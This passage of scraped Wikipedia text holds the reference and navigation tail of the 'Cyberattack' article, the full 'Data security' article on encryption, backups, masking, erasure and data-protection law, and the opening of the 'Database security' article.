 that require organizations to notify people whose personal data has been compromised in a cyberattack.
[
111
]




See also
[
edit
]


Attack patterns
 – computer science concept regarding group of rigorous methods for finding bugs or errors in code related to computer security
Pages displaying wikidata descriptions as a fallback


Black hat (computer security)
 – Computer hacker with malicious intent


Cyberattacks against infrastructure


Cyberattacks by country


Security hacker
 – Computer security term; someone who hacks computer systems


References
[
edit
]






^
 
Asbaş & Tuzlukaya 2022
, p. 303.




^
 
Li & Liu 2021
, p. 8179.




^
 
Li & Liu 2021
, pp. 8177–8179.




^ 
a
 
b
 
Li & Liu 2021
, p. 8183.




^
 
Tjoa 
et al.
 2024
, p. 14.




^
 
Fosco, Molly (30 October 2018). 
"Will Artificial Intelligence Save Us From the Next Cyber Attack?"
. Fast Forward. 
OZY
. Retrieved 
30 October
 2018
.




^
 
Sobers, Rob (16 March 2021). 
"134 Cybersecurity Statistics and Trends for 2021"
. 
Inside Out Security
. Varonis
. Retrieved 
27 February
 2021
.




^
 
"Forecast Analysis: Information Security, Worldwide, 2Q18 Update"
. 
Gartner
. Retrieved 
27 February
 2022
.




^ 
a
 
b
 
c
 
Linkov & Kott 2019
, p. 1.




^
 
Ablon & Bogart 2017
, p. 1.




^ 
a
 
b
 
Ablon & Bogart 2017
, p. 2.




^
 
Daswani & Elbayadi 2021
, p. 25.




^
 
Seaman 2020
, pp. 47–48.




^
 
Daswani & Elbayadi 2021
, pp. 26–27.




^
 
Sloan & Warner 2019
, pp. 104–105.




^
 
Haber & Hibbert 2018
, p. 10.




^
 
Tjoa 
et al.
 2024
, p. 65.




^
 
Linkov & Kott 2019
, pp. 2, 7.




^ 
a
 
b
 
c
 
Linkov & Kott 2019
, p. 2.




^
 
Tjoa 
 et al.
 2024
, p. 3.




^
 
Linkov & Kott 2019
, p. 7.




^
 
Linkov & Kott 2019
, pp. 19–20.




^ 
a
 
b
 
Tjoa 
et al.
 2024
, p. 15.




^
 
Ablon & Bogart 2017
, p. 3.




^
 
Libicki, Ablon & Webb 2015
, pp. 49–50.




^ 
a
 
b
 
c
 
Agrafiotis 
et al.
 2018
, p. 2.




^ 
a
 
b
 
Linkov & Kott 2019
, p. 20.




^
 
Daswani & Elbayadi 2021
, pp. 31–32.




^
 
Tjoa 
et al.
 2024
, p. 63.




^
 
Tjoa 
et al.
 2024
, pp. 68, 70.




^
 
Tjoa 
 et al.
 2024
, pp. 4–5.




^ 
a
 
b
 
Skopik & Pahi 2020
, p. 4.




^ 
a
 
b
 
c
 
d
 
Skopik & Pahi 2020
, p. 5.




^ 
a
 
b
 
c
 
Al-Turjman & Salama 2020
, p. 242.




^
 
Al-Turjman & Salama 2020
, pp. 243–244.




^ 
a
 
b
 
Tjoa et al. 2024
, p. 3.




^ 
a
 
b
 
Skopik & Pahi 2020
, p. 6.




^
 
Skopik & Pahi 2020
, pp. 5–6.




^ 
a
 
b
 
Tjoa 
et al.
 2024
, p. 17.




^
 
Al-Turjman & Salama 2020
, p. 243.




^ 
a
 
b
 
Al-Turjman & Salama 2020
, p. 244.




^
 
Hyslip 2020
, p. 828.




^
 
Tjoa 
et al.
 2024
, p. 3.




^
 
Tjoa 
et al.
 2024
, p. 9.




^ 
a
 
b
 
c
 
Tjoa 
et al.
 2024
, p. 16.




^
 
Tjoa 
et al.
 2024
, pp. 16–17.




^
 
Libicki, Ablon & Webb 2015
, pp. 44–45.




^
 
Libicki, Ablon & Webb 2015
, pp. 44, 46.




^
 
Hyslip 2020
, p. 831.




^
 
Perlroth 2021
, p. 42.




^
 
Perlroth 2021
, p. 58.




^
 
Sood & Enbody 2014
, p. 117.




^ 
a
 
b
 
Hyslip 2020
, p. 816.




^
 
Hyslip 2020
, pp. 831–832.




^
 
Hyslip 2020
, p. 818.




^
 
Hyslip 2020
, p. 820.




^
 
Hyslip 2020
, p. 821.




^
 
Hyslip 2020
, pp. 822–823.




^
 
Hyslip 2020
, p. 828-829.




^
 
Agrafiotis 
et al.
 2018
, p. 7.




^ 
a
 
b
 
c
 
Agrafiotis 
et al.
 2018
, p. 9.




^
 
Agrafiotis 
et al.
 2018
, pp. 10, 12.




^
 
Agrafiotis 
et al.
 2018
, p. 10.




^
 
Agrafiotis 
et al.
 2018
, pp. 7, 10.




^
 
Crawley 2021
, p. 46.




^
 
Fowler 2016
, pp. 7–8.




^ 
a
 
b
 
Fowler 2016
, p. 13.




^
 
Fowler 2016
, pp. 9–10.




^
 
Fowler 2016
, pp. 10–11.




^
 
Fowler 2016
, p. 14.




^
 
Fowler 2016
, pp. 13–14.




^
 
Sloan & Warner 2019
, p. 104.




^
 
Lehto 2022
, p. 36.




^
 
Vähäkainu, Lehto & Kariluoto 2022
, p. 285.




^ 
a
 
b
 
c
 
Shandler & Gomez 2023
, p. 359.




^ 
a
 
b
 
Lehto 2022
, 
passim
.




^
 
Makridis 2021
, p. 1.




^
 
Fowler 2016
, p. 21.




^
 
Agrafiotis 
et al.
 2018
, p. 5.




^
 
Makridis 2021
, pp. 1, 7.




^
 
Sloan & Warner 2019
, p. 64.




^
 
Tjoa 
et al.
 2024
, p. 92.




^
 
Bareja 2021
, pp. 13, 16.




^
 
Tjoa 
et al.
 2024
, pp. 91–93.




^
 
Bareja 2021
, pp. 13–14.




^
 
Tjoa 
et al.
 2024
, p. 94.




^ 
a
 
b
 
Oppenheimer 2024
, p. 39.




^ 
a
 
b
 
c
 
Tjoa 
et al.
 2024
, p. 95.




^
 
Fowler 2016
, pp. 81–82.




^
 
Fowler 2016
, p. 83.




^
 
Fowler 2016
, pp. 120–122.




^
 
Fowler 2016
, p. 115.




^
 
Fowler 2016
, p. 116.




^
 
Fowler 2016
, pp. 117–118.




^
 
Fowler 2016
, p. 124.




^
 
Fowler 2016
, p. 188.




^ 
a
 
b
 
Skopik & Pahi 2020
, p. 1.




^
 
Li & Liu 2021
, p. 8177.




^
 
Skopik & Pahi 2020
, pp. 1, 6.




^
 
Skopik & Pahi 2020
, p. 12.




^
 
Skopik & Pahi 2020
, p. 16.




^
 
Fowler 2016
, p. 44.




^
 
Solove & Hartzog 2022
, p. 58.




^ 
a
 
b
 
Aravindakshan 2021
, p. 299.




^
 
Lilienthal & Ahmad 2015
, p. 399.




^ 
a
 
b
 
Verbruggen, Yola (10 January 2024). 
"Cyberattacks as war crimes"
. 
International Bar Association
. Retrieved 
8 April
 2024
.




^
 
Aravindakshan 2021
, p. 298.




^
 
"Key Issues: Offences against the confidentiality, integrity and availability of computer data and systems"
. 
Cybercrime Module 2
. 
United Nations Office on Drugs and Crime
. Retrieved 
8 April
 2024
.




^
 
Aravindakshan 2021
, p. 296.




^
 
Wilkinson, Isabella (2 August 2023). 
"What is the UN cybercrime treaty and why does it matter?"
. 
Chatham House
. Retrieved 
8 April
 2024
.




^
 
Solove & Hartzog 2022
, p. 10.






Sources
[
edit
]




Ablon, Lillian; Bogart, Andy (2017). 
Zero Days, Thousands of Nights: The Life and Times of Zero-Day Vulnerabilities and Their Exploits
 
(PDF)
. Rand Corporation. 
ISBN
 
978-0-8330-9761-3
.


Al-Turjman, Fadi; Salama, Ramiz (2020). "An Overview about the Cyberattacks in Grid and Like Systems". 
Smart Grid in IoT-Enabled Spaces
. CRC Press. 
ISBN
 
978-1-003-05523-5
.


Agrafiotis, Ioannis; Nurse, Jason R C; Goldsmith, Michael; Creese, Sadie; Upton, David (2018). "A taxonomy of cyber-harms: Defining the impacts of cyber-attacks and understanding how they propagate". 
Journal of Cybersecurity
. 
4
 (1). 
doi
:
10.1093/cybsec/tyy006
. 
ISSN
 
2057-2085
.


Asbaş, C.; Tuzlukaya, Ş. (2022). 
"Cyberattack and Cyberwarfare Strategies for Businesses"
. 
Conflict Management in Digital Business: New Strategy and Approach
. Emerald Group Publishing. pp. 303–328. 
doi
:
10.1108/978-1-80262-773-220221027
. 
ISBN
 
978-1-80262-773-2
.


Aravindakshan, Sharngan (2021). "Cyberattacks: a look at evidentiary thresholds in International Law". 
Indian Journal of International Law
. 
59
 (1–4): 285–299. 
doi
:
10.1007/s40901-020-00113-0
.


Bareja, Dinesh O. (2021). "By Failing to Prepare, You Are Preparing to Fail". 
Security Incidents & Response Against Cyber Attacks
. Springer International Publishing. pp. 13–29. 
ISBN
 
978-3-030-69174-5
.


Crawley, Kim (2021). 
8 Steps to Better Security: A Simple Cyber Resilience Guide for Business
. John Wiley & Sons. 
ISBN
 
978-1-119-81124-4
.


Daswani, Neil
; Elbayadi, Moudy (2021). 
Big Breaches: Cybersecurity Lessons for Everyone
. Apress. 
ISBN
 
978-1-4842-6654-0
.


Fowler, Kevvie (2016). 
Data Breach Preparation and Response: Breaches are Certain, Impact is Not
. Elsevier Science. 
ISBN
 
978-0-12-803451-4
.


Haber, Morey J.; Hibbert, Brad (2018). 
Asset Attack Vectors: Building Effective Vulnerability Management Strategies to Protect Organizations
. Apress. 
ISBN
 
978-1-4842-3627-7
.


Hyslip, Thomas S. (2020). "Cybercrime-as-a-Service Operations". 
The Palgrave Handbook of International Cybercrime and Cyberdeviance
. Springer International Publishing. pp. 815–846. 
ISBN
 
978-3-319-78440-3
.


Lehto, Martti (2022). "Cyber-Attacks Against Critical Infrastructure". 
Cyber Security: Critical Infrastructure Protection
. Springer International Publishing. pp. 3–42. 
ISBN
 
978-3-030-91293-2
.


Li, Yuchong; Liu, Qinghui (2021). 
"A comprehensive review study of cyber-attacks and cyber security; Emerging trends and recent developments"
. 
Energy Reports
. 
7
: 8176–8186. 
Bibcode
:
2021EnRep...7.8176L
. 
doi
:
10.1016/j.egyr.2021.08.126
.


Libicki, Martin C.; Ablon, Lillian; Webb, Tim (2015). 
The Defender's Dilemma: Charting a Course Toward Cybersecurity
 
(PDF)
. Rand Corporation. 
ISBN
 
978-0-8330-8911-3
.


Linkov, Igor; Kott, Alexander (2019). "Fundamental Concepts of Cyber Resilience: Introduction and Overview". 
Cyber Resilience of Systems and Networks
. Springer International Publishing. pp. 1–25. 
ISBN
 
978-3-319-77492-3
.


Lilienthal, Gary; Ahmad, Nehaluddin (2015). "Cyber-attack as inevitable kinetic war". 
Computer Law & Security Review
. 
31
 (3): 390–400. 
doi
:
10.1016/j.clsr.2015.03.002
.


Makridis, Christos A (2021). 
"Do data breaches damage reputation? Evidence from 45 companies between 2002 and 2018"
. 
Journal of Cybersecurity
. 
7
 (1). 
doi
:
10.1093/cybsec/tyab021
.


Oppenheimer, Harry (2024). 
"How the process of discovering cyberattacks biases our understanding of cybersecurity"
. 
Journal of Peace Research
. 
61
 (1): 28–43. 
doi
:
10.1177/00223433231217687
.


Perlroth, Nicole (2021). 
This Is How They Tell Me the World Ends: Winner of the FT & McKinsey Business Book of the Year Award 2021
. Bloomsbury Publishing. 
ISBN
 
978-1-5266-2983-8
.


Seaman, Jim (2020). 
PCI DSS: An Integrated Data Security Standard Guide
. Apress. 
ISBN
 
978-1-4842-5808-8
.


Shandler, Ryan; Gomez, Miguel Alberto (2023). "The hidden threat of cyber-attacks – undermining public confidence in government". 
Journal of Information Technology & Politics
. 
20
 (4): 359–374. 
doi
:
10.1080/19331681.2022.2112796
. 
hdl
:
20.500.11850/566953
.


Skopik, Florian; Pahi, Timea (2020). 
"Under false flag: using technical artifacts for cyber attack attribution"
. 
Cybersecurity
. 
3
 (1): 8. 
doi
:
10.1186/s42400-020-00048-4
. 
ISSN
 
2523-3246
.


Sloan, Robert H.; Warner, Richard (2019). 
Why Don't We Defend Better?: Data Breaches, Risk Management, and Public Policy
. CRC Press. 
ISBN
 
978-1-351-12729-5
.


Solove, Daniel J.
; Hartzog, Woodrow (2022). 
Breached!: Why Data Security Law Fails and How to Improve it
. Oxford University Press. 
ISBN
 
978-0-19-094057-7
.


Sood, Aditya; Enbody, Richard (2014). 
Targeted Cyber Attacks: Multi-staged Attacks Driven by Exploits and Malware
. Syngress. 
ISBN
 
978-0-12-800619-1
.


Tjoa, Simon; Gafić, Melisa; Kieseberg, Peter (2024). 
Cyber Resilience Fundamentals
. Springer Nature. 
ISBN
 
978-3-031-52064-8
.


Vähäkainu, Petri; Lehto, Martti; Kariluoto, Antti (2022). "Cyberattacks Against Critical Infrastructure Facilities and Corresponding Countermeasures". 
Cyber Security: Critical Infrastructure Protection
. Springer International Publishing. pp. 255–292. 
ISBN
 
978-3-030-91293-2
.




v
t
e
Global catastrophic risks


Future of the Earth


Future of an expanding universe


Ultimate fate of the universe


Technological


Chemical warfare


Cyberattack


Cyberwarfare


Cyberterrorism


Cybergeddon


Gray goo


Nanoweapons


Kinetic bombardment


Kinetic energy weapon


Nuclear warfare


Mutual assured destruction


Dead Hand


Doomsday Clock


Doomsday device


Antimatter weapon


Electromagnetic pulse
 (EMP)


Safety of high-energy particle collision experiments


Micro black hole


Strangelet


Synthetic intelligence
 / 
Artificial intelligence


AI takeover


Existential risk from artificial intelligence


Technological singularity


Transhumanism


Sociological


Anthropogenic hazard


Collapsology


Doomsday argument


Self-indication assumption doomsday argument rebuttal


Self-referencing doomsday argument rebuttal


Economic collapse


Malthusian catastrophe


New World Order (conspiracy theory)


Nuclear holocaust


cobalt


famine


winter


Societal collapse


World War III


Ecological
Climate change


Anoxic event


Biodiversity loss


Mass mortality event


Cascade effect


Cataclysmic pole shift hypothesis


Climate change and civilizational collapse


Deforestation


Desertification


Extinction risk from climate change


Tipping points in the climate system


Flood basalt


Global dimming


Global terrestrial stilling


Global warming


Hypercane


Ice age


Ecocide


Ecological collapse


Environmental degradation


Habitat destruction


Human impact on the environment


coral reefs


on marine life


Land degradation


Land consumption


Land surface effects on climate


Ocean acidification


Ozone depletion


Resource depletion


Sea level rise


Supervolcano


winter


Verneshot


Water pollution


Water scarcity


Earth Overshoot Day


Overexploitation


Overpopulation


Human overpopulation


Biological
Extinction


Extinction event


Holocene extinction


Human extinction


List of extinction events


Genetic erosion


Genetic pollution


Others


Biodiversity loss


Decline in amphibian populations


Decline in insect populations


Biotechnology risk


Biological agent


Biological warfare


Bioterrorism


Colony collapse disorder


Defaunation


Dysgenics


Interplanetary contamination


Pandemic


Pollinator decline


Overfishing


Astronomical


Big Crunch


Big Rip


Coronal mass ejection


Cosmological phase transition


Geomagnetic storm


False vacuum decay


Gamma-ray burst


Heat death of the universe


Proton decay


Virtual black hole


Impact event


Asteroid impact avoidance


Asteroid impact prediction


Potentially hazardous object


Near-Earth object


winter


Rogue planet


Near-Earth supernova


Hypernova


Micronova


Solar flare


Stellar collision


Eschatological


Buddhist


Maitreya


Three Ages


Hindu


Kalki


Kali Yuga


Last Judgement


Second Coming


1 Enoch


Daniel


Abomination of desolation


Prophecy of Seventy Weeks


Messiah


Christian


Futurism


Historicism


Interpretations of Revelation


 Idealism


Preterism


2 Esdras


2 Thessalonians


Man of sin


Katechon


Antichrist


Book of Revelation


Events


Four Horsemen of the Apocalypse


Lake of fire


Number of the Beast


Seven bowls


Seven seals


The Beast


Two witnesses


War in Heaven


Whore of Babylon


Great Apostasy


New Earth


New Jerusalem


Olivet Discourse


Great Tribulation


Son of perdition


Sheep and Goats


Islamic


Al-Qa'im


Beast of the Earth


Dhu al-Qarnayn


Dhul-Suwayqatayn


Dajjal


Israfil


Mahdi


Sufyani


Jewish


Messiah


War of Gog and Magog


Third Temple


Norse


Zoroastrian


Saoshyant


Others


2011 end times prediction


2012 phenomenon


Apocalypse


Apocalyptic literature


Apocalypticism


Armageddon


Blood moon prophecy


Earth Changes


End time


Gog and Magog


List of dates predicted for apocalyptic events


Messianism


Messianic Age


Millenarianism


Millennialism


Premillennialism


Amillennialism


Postmillennialism


Nemesis (hypothetical star)


Nibiru cataclysm


Rapture


Prewrath


Post-tribulation rapture


Resurrection of the dead


World to come


Fictional


Alien invasion


Apocalyptic and post-apocalyptic fiction


List of apocalyptic and post-apocalyptic fiction


List of apocalyptic films


Climate fiction


Disaster films


List of disaster films


List of fictional doomsday devices


Zombie apocalypse


Zombie


Organizations


Centre for the Study of Existential Risk


Future of Humanity Institute


Future of Life Institute


Nuclear Threat Initiative


General


Ransomware


Cyberwarfare


Depression


Droughts


Epidemic


Famine


Financial crisis


Pandemic


Riots


Social crisis


Survivalism




 
World portal


 Categories

Apocalypticism


Future problems


Hazards


Risk analysis


Doomsday scenarios




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




Authority control databases
: National 
United States










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Cyberattack&oldid=1244395335
"


Categories
: 
Cyberattacks
Cybercrime
Attacks by method
Security compliance
Hidden categories: 
Pages with non-numeric formatnum arguments
Articles with short description
Short description is different from Wikidata
Use dmy dates from August 2019
Use American English from August 2019
All Wikipedia articles written in American English
Articles containing potentially dated statements from 2019
All articles containing potentially dated statements
Articles containing potentially dated statements from 2023
Pages displaying wikidata descriptions as a fallback via Module:Annotated link
Wikipedia articles with ASCII art











From Wikipedia, the free encyclopedia






Protection of digital data


Data security
  means protecting 
digital data
, such as those in a 
database
, from destructive forces and from the unwanted actions of unauthorized users,
[
1
]
 such as a 
cyberattack
 or a 
data breach
.
[
2
]






Technologies
[
edit
]


Disk encryption
[
edit
]


Main article: 
Disk encryption


. 
Disk encryption
 refers to 
encryption
 technology that encrypts data on a 
hard disk drive
.  Disk encryption typically takes form in either 
software
 (see 
disk encryption software
) or 
hardware
 (see 
disk encryption hardware
). Disk encryption is often referred to as 
on-the-fly encryption
 (OTFE) or transparent encryption.



Software versus hardware-based mechanisms for protecting data
[
edit
]


Software-based security solutions encrypt the data to protect it from theft. However, a 
malicious program
 or a 
hacker
 could 
corrupt the data
 to make it unrecoverable, making the system unusable. Hardware-based security solutions prevent read and write access to data, which provides very strong protection against tampering and unauthorized access.

Hardware-based security or assisted 
computer security
 offers an alternative to software-only computer security. 
Security tokens
 such as those using 
PKCS#11
 or a mobile phone may be more secure due to the physical access required in order to be compromised.
[
3
]
 Access is enabled only when the token is connected and the correct 
PIN
 is entered (see 
two-factor authentication
). However, dongles can be used by anyone who can gain physical access to it. Newer technologies in hardware-based security solve this problem by offering full proof of security for data.
[
4
]


Working off hardware-based security: A hardware device allows a user to log in, log out and set different levels through manual actions. The device uses 
biometric technology
 to prevent malicious users from logging in, logging out, and changing privilege levels. The current state of a user of the device is read by controllers in 
peripheral devices
 such as hard disks. Illegal access by a malicious user or a malicious program is interrupted based on the current state of a user by hard disk and DVD controllers making illegal access to data impossible. Hardware-based access control is more secure than the protection provided by the operating systems as operating systems are vulnerable to malicious attacks by 
viruses
 and hackers. The data on hard disks can be corrupted after malicious access is obtained. With hardware-based protection, the software cannot manipulate the user privilege levels. A 
hacker
 or a malicious program cannot gain access to secure data protected by hardware or perform unauthorized privileged operations. This assumption is broken only if the hardware itself is malicious or contains a backdoor.
[
5
]
 The hardware protects the operating system image and file system privileges from being tampered with. Therefore, a completely secure system can be created using a combination of hardware-based security and secure system administration policies.



Backups
[
edit
]


Main article: 
Backup


Backups
 are used to ensure data that is lost can be recovered from another source. It is considered essential to keep a backup of any data in most industries and the process is recommended for any files of importance to a user.
[
6
]




Data masking
[
edit
]


Main article: 
Data masking


Data masking
 of structured data is the process of obscuring (masking) specific data within a database table or cell to ensure that data security is maintained and sensitive information is not exposed to unauthorized personnel.
[
7
]
 This may include masking the data from users (for example so banking customer representatives can only see the last four digits of a customer's national identity number), developers (who need real production data to test new software releases but should not be able to see sensitive financial data), outsourcing vendors, etc.
[
8
]




Data erasure
[
edit
]


Main article: 
Data erasure


Data erasure
 is a method of software-based overwriting that completely wipes all electronic data residing on a hard drive or other digital media to ensure that no sensitive data is lost when an asset is retired or reused.

[
9
]




International laws and standards
[
edit
]


International laws
[
edit
]


In the 
UK
, the 
Data Protection Act
 is used to ensure that personal data is accessible to those whom it concerns, and provides redress to individuals if there are inaccuracies.
[
10
]
 This is particularly important to ensure individuals are treated fairly, for example for credit checking purposes. The Data Protection Act states that only individuals and companies with legitimate and lawful reasons can process personal information and cannot be shared. 
Data Privacy Day
 is an international 
holiday
 started by the 
Council of Europe
 that occurs every January 28. 

[
11
]


Since the 
General Data Protection Regulation
 (GDPR) of the 
European Union
 (EU) became law on May 25, 2018, organizations may face significant penalties of up to €20 million or 4% of their annual revenue if they do not comply with the regulation.
[
12
]
  It is intended that GDPR will force organizations to understand their 
data privacy
 risks and take the appropriate measures to reduce the risk of unauthorized disclosure of consumers’ private information.

[
13
]




International standards
[
edit
]


The international standards 
ISO/IEC 27001
:2013 and 
ISO/IEC 27002
:2013 cover data security under the topic of 
information security
, and one of its cardinal principles is that all stored information, i.e. data, should be owned so that it is clear whose responsibility it is to protect and control access to that data.
[
14
]
[
15
]
 The following are examples of organizations that help strengthen and standardize computing security:

The 
Trusted Computing Group
 is an organization that helps standardize computing security technologies.

The 
Payment Card Industry Data Security Standard
 (PCI DSS) is a proprietary international information security standard for organizations that handle cardholder information for the major 
debit
, 
credit
, prepaid, 
e-purse
, 
automated teller machines
, and point of sale cards.
[
16
]


The 
General Data Protection Regulation (GDPR)
 proposed by the European Commission will strengthen and unify data protection for individuals within the EU, whilst addressing the export of personal data outside the EU.



Safeguards
[
edit
]


The four types of technical safeguards are access controls, flow controls, inference controls, and 
data encryption
. Access controls manage user entry and data manipulation, while flow controls regulate data dissemination. Inference controls prevent deduction of confidential information from statistical databases and data encryption prevents unauthorized access to confidential information.
[
17
]




See also
[
edit
]




Copy protection


Cyber-security regulation


Data-centric security


Data erasure


Data masking


Data recovery


Digital inheritance


Disk encryption


Comparison of disk encryption software


Identity-based security


Information security


IT network assurance


Pre-boot authentication


Privacy engineering


Privacy law


Raz-Lee


Security breach notification laws


Single sign-on


Smart card


Tokenization


Transparent data encryption


USB flash drive security


Gordon–Loeb model
 for cyber security investments




References
[
edit
]






^
 
Summers, G. (2004). Data and databases.  In: Koehne, H Developing Databases with Access: Nelson Australia Pty Limited. p4-5.




^
 
"Knowing Your Data to Protect Your Data"
. 
IT Business Edge
. 2017-09-25
. Retrieved 
2022-11-03
.




^
 
Thanh, Do van; Jorstad, Ivar; Jonvik, Tore; Thuan, Do van (2009). 
"Strong authentication with mobile phone as security token"
. 
2009 IEEE 6th International Conference on Mobile Adhoc and Sensor Systems
. pp. 777–782. 
doi
:
10.1109/MOBHOC.2009.5336918
. 
ISBN
 
978-1-4244-5114-2
. 
S2CID
 
5470548
.




^
 
Stubbs, Rob (Sep 10, 2019). 
"Why the World is Moving to Hardware-Based Security"
. Fortanix
. Retrieved 
30 September
 2022
.




^
 
Waksman, Adam; Sethumadhavan, Simha (2011), 
"Silencing Hardware Backdoors"
 
(PDF)
, 
Proceedings of the IEEE Symposium on Security and Privacy
, Oakland, California, 
archived
 
(PDF)
 from the original on 2013-09-28




^
 
"Back-ups | Stay Smart Online"
. Archived from 
the original
 on 2017-07-07.




^
 
"Data Masking Definition"
. 
Archived
 from the original on 2017-02-27
. Retrieved 
1 March
 2016
.




^
 
"data masking"
. 
Archived
 from the original on 5 January 2018
. Retrieved 
29 July
 2016
.




^
 
Michael Wei; Laura M. Grupp; Frederick E. Spada; Steven Swanson (2011). 
"Reliably Erasing Data From Flash-Based Solid State Drives"
. 
FAST'11: Proceedings of the 9th USENIX conference on File and storage technologies
. 
Wikidata
 
Q115346857
. Retrieved 
2022-11-22
.




^
 
"data protection act"
. 
Archived
 from the original on 13 April 2016
. Retrieved 
29 July
 2016
.




^
 
Peter Fleischer
, 
Jane Horvath
, 
Shuman Ghosemajumder
 (2008). 
"Celebrating data privacy"
. 
Google Blog
. 
Archived
 from the original on 20 May 2011
. Retrieved 
12 August
 2011
.
{{
cite web
}}
:  CS1 maint: multiple names: authors list (
link
)




^
 
"GDPR Penalties"
. Archived from 
the original
 on 2018-03-31.




^
 
"Detect and Protect for Digital Transformation"
. 
Informatica
. Retrieved 
27 April
 2018
.




^
 
"ISO/IEC 27001:2013"
. 
ISO
. 16 December 2020
. Retrieved 
2022-11-03
.




^
 
"ISO/IEC 27002:2013"
. 
ISO
. 15 April 2021
. Retrieved 
2022-11-03
.




^
 
"PCI DSS Definition"
. 
Archived
 from the original on 2 March 2016
. Retrieved 
1 March
 2016
.




^
 
Denning, Dorothy E., and Peter J. Denning. "Data security." 
ACM computing surveys (CSUR)
 11.3 (1979): 227-249.






External links
[
edit
]


Getting Ready for New Data Laws
 - Local Gov Magazine


EU General Data Protection Regulation (GDPR)


Countering ransomware attacks








Wikimedia Commons has media related to 
Data security
.




v
t
e
Data


Acquisition


Augmentation


Analysis


Archaeology


Big


Cleansing


Collection


Compression


Corruption


Curation


Degradation


Editing


ETL
/
ELT


Extract


Transform


Load


Farming


Format management


Fusion


Integration


Integrity


Library


Lineage


Loss


Management


Migration


Mining


Philanthropy


Pre-processing


Preservation


Processing


Protection (privacy)


Publishing


Recovery


Reduction


Retention


Quality


Science


Scraping


Scrubbing


Security


Stewardship


Storage


Synchronization


Type


Validation


Warehouse


Wrangling/munging




v
t
e
Privacy
Principles


Right of access to personal data


Expectation of privacy


Right to privacy


Right to be forgotten


Post-mortem privacy


Privacy laws


Australia


Brazil


Canada


China


Denmark


England


European Union


Germany


Ghana


New Zealand


Russia


Singapore


Sri Lanka


Switzerland


United Kingdom


United States


California
, 
amended in 2020


Data protection authorities


Australia


Denmark


European Union


France


Germany


India


Indonesia


Ireland


Isle of Man


Netherlands


Norway


Philippines


Poland


South Korea


Spain


Sweden


Switzerland


Thailand


Turkey


United Kingdom


Areas


Consumer


Digital


Education


Medical


Workplace


Information privacy


Law


Financial


Internet


Facebook


Google


Twitter


Email


Personal data


Personal identifier


Social networking services


Privacy-enhancing technologies


Privacy engineering


Privacy-invasive software


Privacy policy


Privacy software


Secret ballot


Virtual assistant privacy


Advocacy organizations


American Civil Liberties Union


Center for Democracy and Technology


Computer Professionals for Social Responsibility


Data Privacy Lab


Electronic Frontier Foundation


Electronic Privacy Information Center


European Digital Rights


Future of Privacy Forum


Global Network Initiative


International Association of Privacy Professionals


NOYB


Privacy International


See also


Anonymity


Cellphone surveillance


Data security


Eavesdropping


Global surveillance


Identity theft


Mass surveillance


Panopticon


PRISM


Search warrant


Wiretapping


Human rights


Personality rights




 
Category












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Data_security&oldid=1246280699
"


Categories
: 
Data security
Data management
Hidden categories: 
CS1 maint: multiple names: authors list
Articles with short description
Short description is different from Wikidata
Commons category link from Wikidata











From Wikipedia, the free encyclopedia






This article 
needs additional citations for 
verification
.
 Please help 
improve this article
 by 
adding citations to reliable sources
. Unsourced material may be challenged and removed.
Find sources:
 
"Database security"
 – 
news
 
·
 
newspapers
 
·
 
books
 
·
 
scholar
 
·
 
JSTOR
 
(
January 2024
)
 (
Learn how and when to remove this message
)


Database security 
 concerns the use of a broad range of information security controls to protect databases  against compromises of their confidentiality, integrity and availability.
[
1
]
 It involves various types or categories of controls, such as technical, procedural or administrative, and physical. 

Security risks to database systems include, for example:



Unauthorized or unintended activity or misuse by authorized database users, database administrators, or network/systems managers, or by unauthorized users or hackers (e.g. inappropriate access to sensitive data, metadata or functions within databases, or inappropriate changes to the database programs, structures or security configurations);


Malware infections causing incidents such as unauthorized access, leakage or disclosure of personal or proprietary data, deletion of or damage to the data or programs, interruption or denial of authorized access to the database, attacks on other systems and the unanticipated failure of database services;


Overloads, performance constraints and capacity issues resulting in the inability of authorized users to use databases as intended;


Physical damage to database servers caused by computer room fires or floods, overheating, lightning, accidental liquid spills, static discharge, electronic breakdowns/equipment failures and obsolescence;


Design flaws and programming bugs in databases and the associated programs and systems, creating various security vulnerabilities (e.g. unauthorized 
privilege escalation
), data loss/corruption, performance degradation etc.;


Data corruption and/or loss caused by the entry of invalid data or commands, mistakes in database or system administration processes, sabotage/criminal damage etc.


Ross J. Anderson
 has often said that by their nature large databases will never be free of abuse by breaches of security; if a large system is designed for ease of access it becomes insecure; if made watertight it becomes impossible to use. This is sometimes known as Anderson's Rule.
[
2
]


Many layers and types of information security control are appropriate to databases, including:



Access control


Auditing


Authentication


Encryption


Integrity
 controls


Backups


Application security



Databases have been largely secured against hackers through 
network security
 measures such as 
firewalls
, and network-based 
intrusion detection
 systems. While network security controls remain valuable in this regard, securing the database systems themselves, and the programs/functions and data within them, has arguably become more critical as networks are increasingly opened to wider access, in particular access from the Internet. Furthermore, system, program, function and data access controls, along with the associated user identification, authentication and rights management functions, have always been important to limit and in some cases log the activities of authorized users and administrators. In other words, these are complementary approaches to database security, working from both the outside-in and the inside-out as it were.

